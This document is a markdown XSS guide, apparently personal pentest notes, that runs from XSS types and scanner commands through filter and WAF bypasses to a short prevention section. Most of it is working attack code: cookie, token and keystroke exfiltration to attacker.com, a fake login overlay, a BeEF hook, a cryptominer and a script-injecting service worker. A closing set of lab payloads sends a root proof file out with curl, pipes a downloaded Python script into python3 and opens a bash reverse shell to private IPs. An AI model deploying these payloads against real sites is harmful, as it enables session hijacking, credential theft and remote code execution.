# Cross-Site Scripting (XSS) - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Reflected Server XSS](#reflected-server-xss)
3. [Stored Server XSS](#stored-server-xss)
4. [Reflected Client XSS (DOM-based)](#reflected-client-xss-dom-based)
5. [Stored Client XSS (DOM-based)](#stored-client-xss-dom-based)
6. [Detection Techniques](#detection-techniques)
7. [Scanning Tools](#scanning-tools)
8. [Attack Examples & Scenarios](#attack-examples--scenarios)
9. [Bypass Techniques](#bypass-techniques)
10. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

Cross-Site Scripting (XSS) is a client-side code injection attack where an attacker executes malicious scripts in a victim's browser. XSS occurs when web applications include untrusted data without proper validation or escaping.

**Impact**:
- Session hijacking (cookie theft)
- Credential harvesting (keylogging, phishing)
- Website defacement
- Malware distribution
- Privilege escalation
- Account takeover

**Classification Matrix**:
```
┌──────────────┬──────────────────┬─────────────────────┐
│ Type         │ Where Payload    │ Where Executed      │
│              │ Stored           │                     │
├──────────────┼──────────────────┼─────────────────────┤
│ Reflected    │ Not stored       │ Server-rendered     │
│ Server       │                  │ HTML response       │
├──────────────┼──────────────────┼─────────────────────┤
│ Stored       │ Database/Server  │ Server-rendered     │
│ Server       │                  │ HTML response       │
├──────────────┼──────────────────┼─────────────────────┤
│ Reflected    │ Not stored       │ Client-side JS      │
│ Client (DOM) │                  │ DOM manipulation    │
├──────────────┼──────────────────┼─────────────────────┤
│ Stored       │ Client-side      │ Client-side JS      │
│ Client (DOM) │ (localStorage)   │ DOM manipulation    │
└──────────────┴──────────────────┴─────────────────────┘
```

---

## Reflected Server XSS

### Detailed Explanation

Reflected XSS occurs when user-supplied data is immediately returned by a web application in its HTTP response without proper sanitization. The malicious script is not stored on the server; instead, it's reflected back in the response.

**Attack Flow**:
1. Attacker crafts malicious URL with XSS payload
2. Victim clicks the link (via email, social media, malicious site)
3. Server receives request with payload
4. Server includes unsanitized payload in HTML response
5. Browser executes malicious script in victim's context

**Common Vulnerable Parameters**:
- Search queries: `?q=`, `?search=`, `?query=`
- Error messages: `?error=`, `?msg=`
- Redirect URLs: `?redirect=`, `?next=`, `?url=`
- User input feedback: `?name=`, `?username=`

### Detection Methods

**Manual Testing**:
```javascript
// Basic probe
<script>alert(1)</script>

// HTML context
"><script>alert(1)</script>

// Attribute context
" onload="alert(1)

// JavaScript context
'-alert(1)-'
';alert(1);//
```

**Indicators of Vulnerability**:
- Your input appears unencoded in HTML source
- Special characters (`<`, `>`, `"`, `'`) are not escaped
- Input is reflected in JavaScript strings without escaping
- Error messages include user input verbatim

### Real-World Scenarios

**Scenario 1: Search Functionality**
```
Target: https://shop.com/search?q=<USER_INPUT>

Vulnerable Response:
<div class="results">
  You searched for: <USER_INPUT>
</div>

Payload: <img src=x onerror=alert(document.domain)>
```

**Scenario 2: Error Messages**
```
Target: https://bank.com/login?error=<MESSAGE>

Vulnerable Response:
<div class="error">Error: <MESSAGE></div>

Payload: </div><script>fetch('https://attacker.com?c='+document.cookie)</script><div>
```

**Scenario 3: Tracking Parameters**
```
Target: https://site.com/page?utm_campaign=<VALUE>

Vulnerable Code:
<script>
  var campaign = "<VALUE>";
  trackCampaign(campaign);
</script>

Payload: "; fetch('https://attacker.com?c='+document.cookie);//
```

---

## Stored Server XSS

### Detailed Explanation

Stored XSS (also called Persistent XSS) is the most dangerous type. The malicious payload is permanently stored on the target server (database, file system, logs) and served to users when they access the affected functionality.

**Attack Flow**:
1. Attacker submits malicious payload (comment, profile, message)
2. Server stores payload in database without sanitization
3. Victim requests page containing stored data
4. Server retrieves and includes payload in HTML response
5. Victim's browser executes malicious script
6. Process repeats for every user viewing the content

**Common Injection Points**:
- Comment sections
- User profiles (bio, about me, signature)
- Forum posts
- Product reviews
- Chat messages
- File metadata (filename, description)
- Support tickets
- Wiki pages

### Detection Methods

**Manual Testing Strategy**:
1. Identify all input fields that store data
2. Submit unique identifiers with XSS payloads
3. Navigate to pages where stored data appears
4. Check if payload executed or appears in source

**Test Payloads**:
```html
<!-- Unique identifier for tracking -->
<script>alert('XSS-STORED-COMMENT-001')</script>

<!-- Image-based (often bypasses filters) -->
<img src=x onerror=alert('XSS-'+document.domain)>

<!-- SVG-based -->
<svg/onload=alert(1)>

<!-- Event handler -->
<body onload=alert(1)>

<!-- Link-based -->
<a href="javascript:alert(1)">Click</a>
```

### Real-World Scenarios

**Scenario 1: Comment Section**
```
Application: Blog platform
Injection Point: POST /api/comments
Body: {"comment": "<PAYLOAD>"}

Vulnerable Code (Backend):
db.query("INSERT INTO comments (text) VALUES ('" + req.body.comment + "')")

Vulnerable Code (Frontend):
<div class="comment">${comment.text}</div>

Attack Chain:
1. Submit: <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
2. Payload stored in database
3. Every visitor to blog post executes the payload
4. Cookies exfiltrated to attacker server
```

**Scenario 2: User Profile**
```
Application: Social network
Injection Point: Profile "About Me" field

Payload: <svg/onload=s=createElement('script');body.appendChild(s);s.src='//attacker.com/hook.js'>

Impact:
- Every user viewing the profile gets hooked
- Attacker gains persistent access to sessions
- Can perform actions as victim users
```

**Scenario 3: Support Ticket System**
```
Application: Customer support portal
Injection Point: Ticket subject/description

Payload (targeting support staff):
<script>
if(document.domain.includes('admin')){
  fetch('https://attacker.com/admin-session', {
    method: 'POST',
    body: document.cookie + '|' + localStorage.getItem('token')
  });
}
</script>

Impact: Compromise support staff accounts with elevated privileges
```

---

## Reflected Client XSS (DOM-based)

### Detailed Explanation

DOM-based XSS occurs when client-side JavaScript reads data from an untrusted source (URL, DOM elements) and writes it to a dangerous sink (innerHTML, eval, document.write) without proper sanitization. The server never sees or includes the malicious payload.

**Key Difference**: The vulnerability exists in client-side code, not server-side. The HTTP response from the server is benign; the attack happens entirely in the browser.

**Common Sources** (where attackers control data):
- `window.location` (href, hash, search, pathname)
- `document.URL`
- `document.referrer`
- `window.name`
- URL parameters accessed by JavaScript

**Common Sinks** (dangerous functions):
- `innerHTML`, `outerHTML`
- `document.write()`, `document.writeln()`
- `eval()`, `Function()`, `setTimeout()`, `setInterval()`
- `element.setAttribute()`
- jQuery: `.html()`, `.append()`, `.after()`

### Detection Methods

**Manual Testing**:
1. Identify JavaScript that processes URL parameters
2. Test with probe values in URL fragments and parameters
3. Monitor DOM changes in browser DevTools
4. Check if payload executes without appearing in HTTP response

**Browser DevTools Detection**:
```javascript
// Check if input flows to dangerous sink
// Set breakpoint on innerHTML assignments
Object.defineProperty(Element.prototype, 'innerHTML', {
  set: function(value) {
    console.trace('innerHTML set to:', value);
  }
});
```

### Real-World Scenarios

**Scenario 1: URL Fragment Processing**
```javascript
// Vulnerable Code
var username = window.location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Welcome ' + username;

// Attack URL
https://site.com/dashboard#<img src=x onerror=alert(document.domain)>

// Execution Flow
1. User visits malicious URL
2. JavaScript extracts hash: "<img src=x onerror=alert(document.domain)>"
3. Sets innerHTML with unsanitized data
4. Browser parses and executes onerror handler
```

**Scenario 2: Search with Client-Side Rendering**
```javascript
// Vulnerable Code
var search = new URLSearchParams(window.location.search).get('q');
document.querySelector('#results').innerHTML = 'Results for: ' + search;

// Attack URL
https://site.com/search?q=<svg/onload=alert(1)>

// Note: Server returns clean HTML; XSS happens in browser
```

**Scenario 3: Document.write Vulnerability**
```javascript
// Vulnerable Code
var trackingId = window.location.search.split('tid=')[1];
document.write('<img src="/track.gif?id=' + trackingId + '">');

// Attack URL
https://site.com/page?tid=1"><script>alert(1)</script><img src="

// Resulting HTML
<img src="/track.gif?id=1"><script>alert(1)</script><img src="">
```

---

## Stored Client XSS (DOM-based)

### Detailed Explanation

This is a hybrid attack combining DOM-based XSS with persistence. The payload is stored in client-side storage mechanisms (localStorage, sessionStorage, IndexedDB, cookies) and later retrieved and unsafely processed by JavaScript.

**Attack Flow**:
1. Attacker finds way to write to client-side storage (XSS, open redirect, subdomain takeover)
2. Malicious data persists in browser storage
3. Legitimate JavaScript reads from storage
4. Data flows to dangerous sink without sanitization
5. Payload executes on every page load

**Storage Mechanisms**:
- `localStorage` (persistent)
- `sessionStorage` (session-only)
- `IndexedDB` (structured storage)
- Cookies (if accessed by JavaScript)
- Service Workers (advanced persistence)

### Detection Methods

**Manual Testing**:
```javascript
// Test localStorage injection
localStorage.setItem('username', '<img src=x onerror=alert(1)>');
// Reload page and check if payload executes

// Inspect all storage
console.log('localStorage:', localStorage);
console.log('sessionStorage:', sessionStorage);
console.log('cookies:', document.cookie);

// Find vulnerable code patterns
// Search for: innerHTML + localStorage/sessionStorage
```

### Real-World Scenarios

**Scenario 1: User Preferences**
```javascript
// Application stores user display name
function saveProfile() {
  localStorage.setItem('displayName', document.getElementById('name').value);
}

// Vulnerable retrieval
function loadProfile() {
  var name = localStorage.getItem('displayName');
  document.getElementById('greeting').innerHTML = 'Hello, ' + name;
}

// Attack
1. User inputs: <img src=x onerror=fetch('//attacker.com?'+document.cookie)>
2. Data saved to localStorage
3. Every page load executes payload
4. Persists across sessions until localStorage cleared
```

**Scenario 2: Shopping Cart Exploit**
```javascript
// Vulnerable cart display
function displayCart() {
  var cart = JSON.parse(localStorage.getItem('cart')) || [];
  cart.forEach(item => {
    $('#cart-items').append('<li>' + item.name + '</li>'); // jQuery .append()
  });
}

// Attack via price manipulation endpoint
POST /api/cart/add
{
  "productId": 123,
  "name": "<img src=x onerror=alert(1)>",
  "price": 0
}

// If backend doesn't sanitize, malicious name stored in localStorage
```

**Scenario 3: Service Worker Persistence**
```javascript
// Extremely persistent attack
// If attacker gains XSS, they can register malicious service worker

navigator.serviceWorker.register('/malicious-sw.js');

// malicious-sw.js intercepts ALL requests
self.addEventListener('fetch', function(event) {
  event.respondWith(
    fetch(event.request).then(response => {
      return response.text().then(text => {
        // Inject payload into every page
        text = text.replace('</body>',
          '<script src="https://attacker.com/hook.js"></script></body>');
        return new Response(text, {headers: response.headers});
      });
    })
  );
});
```

---

## Detection Techniques

### Manual Detection Workflow

**Step 1: Identify Input Vectors**
- URL parameters (GET/POST)
- HTTP headers (Referer, User-Agent, X-Forwarded-For)
- File uploads (filename, metadata)
- JSON/XML API payloads
- WebSocket messages

**Step 2: Identify Reflection Points**
- View page source for input reflections
- Check JavaScript variables
- Inspect HTTP responses
- Review error messages
- Check AJAX responses

**Step 3: Context Identification**
```
Contexts:
1. HTML context: <div>USER_INPUT</div>
2. Attribute context: <input value="USER_INPUT">
3. JavaScript context: var x = "USER_INPUT";
4. URL context: <a href="USER_INPUT">
5. CSS context: <style>...USER_INPUT...</style>
```

**Step 4: Payload Testing**
```javascript
// HTML Context
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

// Attribute Context (inside quotes)
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='

// JavaScript String Context
'-alert(1)-'
';alert(1);//
</script><script>alert(1)</script>

// Event Handler Context
alert(1)
alert(1)//

// URL Context
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### Automated Detection

**Browser-Based Detection**:
1. **DOM Invader** (Burp Suite Extension)
   - Automatically detects DOM XSS
   - Identifies sources and sinks
   - Tests for exploitability

2. **Browser DevTools**:
   ```javascript
   // Monitor innerHTML changes
   const observer = new MutationObserver(mutations => {
     mutations.forEach(mutation => {
       console.log('DOM changed:', mutation);
     });
   });
   observer.observe(document.body, {
     childList: true,
     subtree: true,
     attributes: true
   });
   ```

---

## Scanning Tools

### Comprehensive Tool List

#### 1. XSStrike
**Type**: Python-based intelligent XSS scanner
```bash
# Activate environnment
# source ~/tools/xssstrike/bin/activate
# cd /~tools/XSStrike
# python3 xsstrike.py ...
# deactivate

# Basic scan
xsstrike -u "https://target.com/search?q=test"

# POST request
xsstrike -u "https://target.com/submit" --data "name=test&email=test@test.com"

# Crawl and scan
xsstrike -u "https://target.com" --crawl --level 3

# Skip DOM scanner (faster)
xsstrike -u "https://target.com/page?q=test" --skip-dom

# Custom headers
xsstrike -u "https://target.com/api" --headers "Authorization: Bearer TOKEN"

# Blind XSS
xsstrike -u "https://target.com/contact" --data "message=test" --blind https://xss.report/c/YOUR_ID
```

#### 2. Dalfox
**Type**: Go-based fast XSS scanner with DOM mining
```bash
# Basic URL scan
dalfox url https://target.com/search?q=FUZZ

# File-based scanning
dalfox file urls.txt

# POST request
dalfox url https://target.com/submit --data "name=FUZZ&email=test@test.com" --method POST

# DOM mining
dalfox url https://target.com/page --mining-dom --mining-dom-depth 5

# Blind XSS with callback
dalfox url https://target.com/contact --blind https://your-callback-server.com

# Custom payload
dalfox url https://target.com?q=FUZZ --custom-payload "<svg/onload=alert(1)>"

# Output to file
dalfox file targets.txt -o results.json

# Only specific parameters
dalfox url https://target.com?a=1&b=2 -p b

# Grep for specific patterns
dalfox url https://target.com?q=FUZZ --grep "alert"
```

#### 3. Burp Suite
**Features**:
- **Scanner** (Professional): Automated active/passive scanning
- **Repeater**: Manual testing
- **Intruder**: Fuzzing with payloads
- **DOM Invader**: DOM XSS detection
- **Collaborator**: Blind XSS detection

**Workflow**:
```
1. Proxy traffic through Burp
2. Spider/crawl target
3. Send interesting requests to Repeater
4. Test manually with various payloads
5. Use Intruder for systematic fuzzing
6. Enable DOM Invader in browser
7. Use Collaborator payloads for blind XSS
```

**Useful Extensions**:
- XSS Validator
- CO2 (SQLi/XSS scanner)
- Reflected Parameters
- JS Link Finder

#### 4. OWASP ZAP
```bash
# Command-line active scan
zap-cli active-scan https://target.com

# Spider + scan
zap-cli quick-scan https://target.com

# API mode
zap.sh -daemon -config api.key=YOUR_KEY
# Then use API

# With authentication
zap-cli --api-key KEY --auth-token TOKEN active-scan https://target.com
```

#### 5. XSS Hunter
**Type**: Blind XSS platform
- Free service: https://xsshunter.com
- Self-hosted option available
- Captures screenshots, cookies, DOM
- Email notifications on XSS trigger

**Usage**:
```javascript
// Payload format
<script src="https://YOUR_ID.xss.ht"></script>

// Image-based
"><script src=https://YOUR_ID.xss.ht></script>

// For stored XSS in forms, comments, etc.
```

#### 6. Additional Tools

**Knocker** (DOM XSS scanner):
```bash
python knocker.py --url https://target.com
```

**XSSCon** (Simple CLI):
```bash
xsscon -u https://target.com?q=test
```

**BruteXSS**:
```bash
brutexss -u https://target.com?q=FUZZ -w payloads.txt
```

**Browser Extensions**:
- **XSS Rays**: Chrome extension for XSS detection
- **Wappalyzer**: Identify technologies (helps craft payloads)
- **HackTools**: Collection of payloads

---

## Attack Examples & Scenarios

### Advanced Attack Scenarios

#### 1. Session Hijacking via Cookie Theft
```javascript
// Payload
<script>
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    url: document.location.href,
    domain: document.domain,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  })
});
</script>

// Shortened for URL injection
<script src=//attacker.com/x.js></script>
```

#### 2. Keylogger Injection
```javascript
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/log?key=' + e.key + '&page=' + location.href);
});
</script>
```

#### 3. Credential Harvesting (Phishing)
```javascript
<script>
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999">
    <h2>Session Expired - Please Login</h2>
    <form action="https://attacker.com/harvest" method="POST">
      <input name="username" placeholder="Username"><br>
      <input type="password" name="password" placeholder="Password"><br>
      <button>Login</button>
    </form>
  </div>
`;
</script>
```

#### 4. BeEF Hook (Browser Exploitation Framework)
```javascript
<script src="http://attacker-beef-server:3000/hook.js"></script>
```

#### 5. Cryptocurrency Mining
```javascript
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
miner.start();
</script>
```

#### 6. Website Defacement
```javascript
<script>
document.body.innerHTML = '<h1>Hacked by Attacker</h1><img src="https://attacker.com/defacement.jpg">';
</script>
```

#### 7. Port Scanning (Internal Network)
```javascript
<script>
const ports = [80, 443, 8080, 3306, 5432];
ports.forEach(port => {
  fetch('http://192.168.1.1:' + port)
    .then(() => fetch('https://attacker.com/log?open=' + port))
    .catch(() => {});
});
</script>
```

---

## Bypass Techniques

### Filter Bypasses

#### 1. Case Variation
```javascript
<ScRiPt>alert(1)</sCrIpT>
<sCrIpT>alert(1)</ScRiPt>
```

#### 2. Tag Alternatives
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>
```

#### 3. Event Handler Variations
```html
onload, onerror, onfocus, onblur, onmouseover, onmouseout,
onclick, ondblclick, onkeydown, onkeyup, onchange, onsubmit,
ontoggle, onanimationstart, onanimationend, ontransitionend
```

#### 4. Encoding Bypasses
```javascript
// HTML Entity Encoding
&lt;script&gt;alert(1)&lt;/script&gt;

// URL Encoding
%3Cscript%3Ealert(1)%3C/script%3E

// Unicode Encoding
\u003cscript\u003ealert(1)\u003c/script\u003e

// Hex Encoding
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>

// Decimal Encoding
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

#### 5. Whitespace and Newline Bypasses
```html
<svg/onload=alert(1)>
<svg		onload=alert(1)>
<svg
onload=alert(1)>
```

#### 6. JavaScript Alternatives to alert()
```javascript
confirm(1)
prompt(1)
console.log(1)
document.write(1)
throw 1
eval('ale'+'rt(1)')
Function('ale'+'rt(1)')()
[].constructor.constructor('ale'+'rt(1)')()
```

#### 7. WAF Bypass Techniques
```javascript
// String concatenation
<script>eval('al'+'ert(1)')</script>

// Comment injection
<script>/**/alert(1)</script>
<script>al<!---->ert(1)</script>

// JSFuck (JavaScript encoded)
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]...]

// Template literals
<script>`${alert(1)}`</script>

// Polyglot payloads (works in multiple contexts)
'"--></script><script>alert(1)</script>
```

#### 8. CSP Bypass
```javascript
// If script-src allows 'unsafe-inline'
<script>alert(1)</script>

// JSONP endpoints bypass
<script src="https://trusted.com/jsonp?callback=alert(1)"></script>

// Angular template injection (if Angular loaded)
{{constructor.constructor('alert(1)')()}}

// Dangling markup injection
<img src='//attacker.com?data=
```

#### 9. Other examples
```javascript
const params = new URLSearchParams();
params.append('cmd', 'curl 192.168.45.240/$(cat /root/proof.txt)');

fetch('http://localhost:3000/run_command', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: params.toString()
});
```

```javascript
fetch('http://localhost:3000/run_command', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: "cmd=curl Kali_IP/evil2.py | python3"
 
}).then(function(response) {
    response.text().then(function(text) {
    window.location.href="http://LOCAL_IP/a?b=" + btoa(text);
    });
});
```
```javascript
fetch("http://192.168.45.242:8888/k");

fetch("http://localhost:3000/run_command", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
    },
    body: new URLSearchParams({ cmd: "bash -c 'bash -i >& /dev/tcp/192.168.45.242/4444 0>&1'" })
});
```
```javascript
// fetch("http://192.168.45.242:8888/p.js")
var script = document.createElement('script');
script.src = 'http://192.168.45.242:8888/p.js';
document.body.appendChild(script);
```


---

## Prevention & Mitigation

### Secure Coding Practices

#### 1. Output Encoding (Context-Aware)
```javascript
// HTML Context
function htmlEncode(str) {
  return str.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
}

// JavaScript Context
function jsEncode(str) {
  return str.replace(/\\/g, '\\\\')
            .replace(/'/g, "\\'")
            .replace(/"/g, '\\"')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r');
}

// URL Context
encodeURIComponent(userInput)
```

#### 2. Use Safe APIs
```javascript
// BAD
element.innerHTML = userInput;

// GOOD
element.textContent = userInput;
element.innerText = userInput;
element.setAttribute('value', userInput);

// For HTML rendering, use sanitization library
element.innerHTML = DOMPurify.sanitize(userInput);
```

#### 3. Content Security Policy (CSP)
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; object-src 'none'
```

**Best Practices**:
- Avoid `'unsafe-inline'` and `'unsafe-eval'`
- Use nonces or hashes for inline scripts
- Whitelist trusted domains
- Enable `report-uri` to monitor violations

#### 4. HTTP Headers
```http
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

#### 5. Input Validation
```javascript
// Whitelist approach
const allowedPattern = /^[a-zA-Z0-9\s]+$/;
if (!allowedPattern.test(userInput)) {
  return 'Invalid input';
}

// Length limits
if (userInput.length > 100) {
  return 'Input too long';
}
```

#### 6. Framework-Specific Protection

**React**:
```javascript
// React automatically escapes by default
<div>{userInput}</div>  // Safe

// Dangerous (avoid)
<div dangerouslySetInnerHTML={{__html: userInput}}></div>
```

**Angular**:
```typescript
// Angular sanitizes by default
<div>{{userInput}}</div>  // Safe

// For trusted HTML
import { DomSanitizer } from '@angular/platform-browser';
this.sanitizer.sanitize(SecurityContext.HTML, userInput);
```

**Vue.js**:
```javascript
// Safe
<div>{{ userInput }}</div>

// Dangerous
<div v-html="userInput"></div>  // Only use with sanitized data
```

### Testing Checklist

- [ ] All user inputs validated and sanitized
- [ ] Output encoding applied based on context
- [ ] CSP implemented and tested
- [ ] Security headers configured
- [ ] Framework security features enabled
- [ ] Third-party libraries up to date
- [ ] DOM-based XSS sinks identified and secured
- [ ] Automated XSS scanning in CI/CD
- [ ] Regular penetration testing
- [ ] Security awareness training for developers

---

**Additional Resources**:
- OWASP XSS Prevention Cheat Sheet
- PortSwigger Web Security Academy - XSS
- Google XSS Game: https://xss-game.appspot.com/
- HackerOne XSS Reports
